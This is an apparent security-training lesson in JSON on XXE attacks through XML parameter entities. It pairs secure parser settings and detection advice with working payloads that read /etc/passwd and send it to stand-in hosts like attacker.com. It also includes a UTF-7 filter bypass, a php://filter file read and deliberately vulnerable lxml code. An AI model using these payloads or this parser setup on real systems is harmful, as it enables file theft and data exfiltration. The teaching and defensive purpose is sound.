@@ -1,0 +1,136 @@
+{
+  "id": "parameter-entities",
+  "category": "vulnerabilities",
+  "title": "Parameter Entity Exploitation",
+  "description": "Deep dive into parameter entities in DTDs and their role in advanced XXE exploitation techniques.",
+  "severity": "high",
+  "cvssScore": 8.2,
+  "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
+  "cwe": "CWE-611: Improper Restriction of XML External Entity Reference",
+  "owasp": "OWASP Top 10:2021 - A05: Security Misconfiguration",
+  "sections": [
+    {
+      "id": "overview",
+      "title": "Overview",
+      "type": "text",
+      "content": "Parameter entities are a special type of entity that can only be referenced within DTD declarations. They are prefixed with a percent sign (%) and provide powerful capabilities that attackers leverage for advanced XXE exploitation.\n\n**Key Differences from General Entities:**\n• Parameter entities use % prefix instead of &\n• Can only be referenced within DTD (not in document content)\n• Can be used to construct dynamic DTD declarations\n• Essential for blind XXE and advanced exploitation techniques\n\n**Why Parameter Entities Matter for XXE:**\n1. Enable external DTD inclusion for blind XXE\n2. Allow dynamic entity construction at parse time\n3. Bypass restrictions on general entity expansion\n4. Enable out-of-band data exfiltration\n5. Can nest and chain for complex attacks"
+    },
+    {
+      "id": "syntax",
+      "title": "Parameter Entity Syntax",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<!-- Defining a parameter entity -->\n<!ENTITY % paramEntity \"entity content\">\n\n<!-- Referencing a parameter entity (in DTD only) -->\n%paramEntity;\n\n<!-- External parameter entity -->\n<!ENTITY % remote SYSTEM \"http://attacker.com/evil.dtd\">\n%remote;\n\n<!-- Parameter entity with file content -->\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n\n<!-- Using parameter entity to define general entity -->\n<!ENTITY % wrapper \"<!ENTITY generalEntity '%file;'>\">\n%wrapper;",
+        "isVulnerable": false,
+        "filename": "parameter-entity-syntax.xml"
+      }
+    },
+    {
+      "id": "restrictions",
+      "title": "Parameter Entity Restrictions",
+      "type": "text",
+      "content": "**DTD-Only Scope:**\nParameter entities can only be referenced within DTD declarations, not in document content:\n\n✅ Valid: <!ENTITY general \"%param;\">  (inside DTD)\n❌ Invalid: <data>%param;</data>  (in document content)\n\n**External Subset Requirement:**\nParameter entity replacement text cannot directly include other parameter entities in internal DTD subset. This restriction is bypassed by using external DTD subsets.\n\n**Nesting Limitations:**\nDirect nesting like %entity1; inside %entity2; definition requires external DTD. This is why blind XXE typically requires fetching external DTD from attacker server."
+    },
+    {
+      "id": "internal-vs-external",
+      "title": "Internal vs External DTD Subsets",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<!-- Internal DTD subset (inline in DOCTYPE) -->\n<!DOCTYPE root [\n  <!ENTITY % param \"value\">\n  <!-- Cannot directly use %param; to define another entity here -->\n]>\n\n<!-- External DTD subset (referenced from DOCTYPE) -->\n<!DOCTYPE root [\n  <!ENTITY % remote SYSTEM \"http://attacker.com/evil.dtd\">\n  %remote; <!-- Fetches and processes external DTD -->\n]>\n\n<!-- evil.dtd on attacker server -->\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>\">\n%eval;\n<!-- Now %file; can be used within %eval; definition -->",
+        "isVulnerable": true,
+        "filename": "dtd-subsets.xml"
+      }
+    },
+    {
+      "id": "exploitation-chain",
+      "title": "Parameter Entity Exploitation Chain",
+      "type": "text",
+      "content": "A typical parameter entity XXE attack follows this chain:\n\n**Step 1: Declare external parameter entity**\n<!ENTITY % remote SYSTEM \"http://attacker.com/xxe.dtd\">\n\n**Step 2: Reference it to fetch external DTD**\n%remote;\n\n**Step 3: External DTD reads file**\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n\n**Step 4: External DTD creates dynamic entity**\n<!ENTITY % eval \"<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?d=%file;'>\">\n\n**Step 5: Evaluate the dynamic entity**\n%eval;\n\n**Step 6: Trigger the exfiltration**\n%send;\n\n**Result:** File content sent to attacker server in HTTP request."
+    },
+    {
+      "id": "complete-example",
+      "title": "Complete Parameter Entity Attack",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<!-- User-submitted XML payload -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY % remote SYSTEM \"http://attacker.com/xxe.dtd\">\n  %remote;\n]>\n<root>\n  <data>test</data>\n</root>\n\n<!-- xxe.dtd hosted on attacker.com -->\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/log?data=%file;'>\">\n%eval;\n%exfil;\n\n<!-- What happens: -->\n<!-- 1. Parser loads external DTD from attacker.com -->\n<!-- 2. %file; reads /etc/passwd -->\n<!-- 3. %eval; creates %exfil; entity with file content -->\n<!-- 4. %exfil; triggers HTTP request with file content -->\n<!-- 5. Attacker receives /etc/passwd in HTTP server logs -->",
+        "isVulnerable": true,
+        "filename": "param-entity-attack.xml"
+      }
+    },
+    {
+      "id": "entity-encoding",
+      "title": "Entity Reference Encoding",
+      "type": "text",
+      "content": "Notice the use of &#x25; in parameter entity definitions. This is crucial:\n\n**Why &#x25; instead of %?**\n• &#x25; is XML numeric character reference for '%'\n• Required when defining entities that contain % symbols\n• Prevents premature entity expansion during parsing\n\n**Example:**\n<!ENTITY % wrapper \"<!ENTITY &#x25; inner 'value'>\">\n\nWhen %wrapper; is expanded, it becomes:\n<!ENTITY % inner 'value'>\n\n**Without proper encoding:**\n<!ENTITY % wrapper \"<!ENTITY % inner 'value'>\"> ❌ Parse error\n\n**With proper encoding:**\n<!ENTITY % wrapper \"<!ENTITY &#x25; inner 'value'>\"> ✅ Correct"
+    },
+    {
+      "id": "vulnerable-python",
+      "title": "Vulnerable Python Code",
+      "type": "code",
+      "code": {
+        "language": "python",
+        "code": "import xml.etree.ElementTree as ET\nfrom lxml import etree\n\n# Vulnerable: lxml with default settings\ndef parse_xml_vulnerable(xml_data):\n    parser = etree.XMLParser()  # Default allows external entities\n    tree = etree.fromstring(xml_data, parser)\n    return tree\n\n# Also vulnerable: resolving entities explicitly\ndef parse_xml_also_vulnerable(xml_data):\n    parser = etree.XMLParser(resolve_entities=True)  # Explicitly dangerous\n    tree = etree.fromstring(xml_data, parser)\n    return tree\n\n# Example usage that would be exploited\nxml_input = '''<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n  <!ENTITY % remote SYSTEM \"http://attacker.com/xxe.dtd\">\n  %remote;\n]>\n<root><data>test</data></root>'''\n\ntree = parse_xml_vulnerable(xml_input)  # Fetches external DTD",
+        "isVulnerable": true,
+        "filename": "vulnerable_parser.py"
+      }
+    },
+    {
+      "id": "secure-python",
+      "title": "Secure Python Code",
+      "type": "code",
+      "code": {
+        "language": "python",
+        "code": "from lxml import etree\nfrom defusedxml.lxml import fromstring as defused_fromstring\n\n# Secure: Disable entity resolution\ndef parse_xml_secure(xml_data):\n    parser = etree.XMLParser(\n        resolve_entities=False,  # Disable entity expansion\n        no_network=True,         # Disable network access\n        dtd_validation=False,    # Disable DTD validation\n        load_dtd=False          # Don't load DTD\n    )\n    tree = etree.fromstring(xml_data, parser)\n    return tree\n\n# Best practice: Use defusedxml library\ndef parse_xml_best_practice(xml_data):\n    # defusedxml automatically applies security settings\n    tree = defused_fromstring(xml_data)\n    return tree\n\n# Example safe usage\nxml_input = '''<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n  <!ENTITY % remote SYSTEM \"http://attacker.com/xxe.dtd\">\n  %remote;\n]>\n<root><data>test</data></root>'''\n\ntry:\n    tree = parse_xml_secure(xml_input)  # Will reject external entities\nexcept etree.XMLSyntaxError as e:\n    print(f\"Blocked malicious XML: {e}\")",
+        "isVulnerable": false,
+        "filename": "secure_parser.py"
+      }
+    },
+    {
+      "id": "advanced-techniques",
+      "title": "Advanced Parameter Entity Techniques",
+      "type": "text",
+      "content": "**1. Chained Parameter Entities**\nMultiple levels of parameter entity references for complex attacks:\n• %level1; defines %level2;\n• %level2; defines %level3;\n• %level3; performs exfiltration\n\n**2. UTF-7 Encoding Bypass**\nUse UTF-7 encoding to bypass filters:\n<?xml version=\"1.0\" encoding=\"UTF-7\"?>\n+ADw-!ENTITY % remote SYSTEM \"http://evil.com/xxe.dtd\"+AD4-\n\n**3. Base64 Encoding for Binary Files**\nUse PHP's data:// wrapper for base64 encoding:\n<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">\n\n**4. Conditional Entity Definitions**\nDefine entities conditionally based on environment:\n<!ENTITY % win \"file:///c:/windows/win.ini\">\n<!ENTITY % unix \"file:///etc/passwd\">"
+    },
+    {
+      "id": "java-secure",
+      "title": "Secure Java Configuration",
+      "type": "code",
+      "code": {
+        "language": "java",
+        "code": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\n\npublic class SecureXMLParser {\n    public Document parseXML(String xml) throws Exception {\n        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n        \n        // Disable DOCTYPE declarations entirely (strongest protection)\n        factory.setFeature(\n            \"http://apache.org/xml/features/disallow-doctype-decl\", \n            true\n        );\n        \n        // If DOCTYPE needed, disable external entities\n        factory.setFeature(\n            \"http://xml.org/sax/features/external-general-entities\", \n            false\n        );\n        factory.setFeature(\n            \"http://xml.org/sax/features/external-parameter-entities\",\n            false  // Specifically blocks parameter entities\n        );\n        factory.setFeature(\n            \"http://apache.org/xml/features/nonvalidating/load-external-dtd\",\n            false\n        );\n        \n        // Additional security settings\n        factory.setXIncludeAware(false);\n        factory.setExpandEntityReferences(false);\n        \n        DocumentBuilder builder = factory.newDocumentBuilder();\n        return builder.parse(new ByteArrayInputStream(xml.getBytes()));\n    }\n}",
+        "isVulnerable": false,
+        "filename": "SecureXMLParser.java"
+      }
+    },
+    {
+      "id": "detection",
+      "title": "Detecting Parameter Entity Attacks",
+      "type": "text",
+      "content": "**Code Review Indicators:**\n• XML parsers without explicit external entity controls\n• Resolving entities enabled (resolve_entities=True)\n• Missing security features in parser configuration\n• DTD processing not explicitly disabled\n\n**Runtime Detection:**\n• Outbound HTTP/DNS requests from XML parser processes\n• Connections to unexpected external hosts during XML processing\n• DNS queries with unusual subdomains during parsing\n• Error messages mentioning external entity loading\n\n**Testing Approach:**\n1. Submit XML with external parameter entity reference\n2. Monitor for outbound connections to test server\n3. Check if external DTD is fetched\n4. Attempt file exfiltration via parameter entities\n5. Test error-based parameter entity techniques"
+    },
+    {
+      "id": "prevention",
+      "title": "Prevention Best Practices",
+      "type": "text",
+      "content": "1. **Disable External Parameter Entities**: Explicitly set external-parameter-entities feature to false\n2. **Disable DOCTYPE**: Disallow DOCTYPE declarations entirely if not needed\n3. **Use Secure Parsers**: Leverage libraries like defusedxml (Python), configure secure features (Java/.NET)\n4. **Input Validation**: Reject XML containing DOCTYPE or <!ENTITY declarations\n5. **Network Controls**: Block outbound connections from XML processing servers\n6. **Regular Updates**: Keep XML parsing libraries up to date\n7. **Defense in Depth**: Combine multiple protective measures\n8. **Static Analysis**: Use tools to detect insecure XML parser configurations"
+    }
+  ],
+  "relatedTopics": ["blind-xxe", "classic-xxe", "file-disclosure"],
+  "references": [
+    {
+      "title": "XML Parameter Entities Specification",
+      "url": "https://www.w3.org/TR/xml/#dt-PE"
+    },
+    {
+      "title": "PortSwigger: XXE via Parameter Entities",
+      "url": "https://portswigger.net/web-security/xxe#exploiting-xxe-to-retrieve-files"
+    },
+    {
+      "title": "OWASP XXE Prevention",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html"
+    }
+  ]
+}
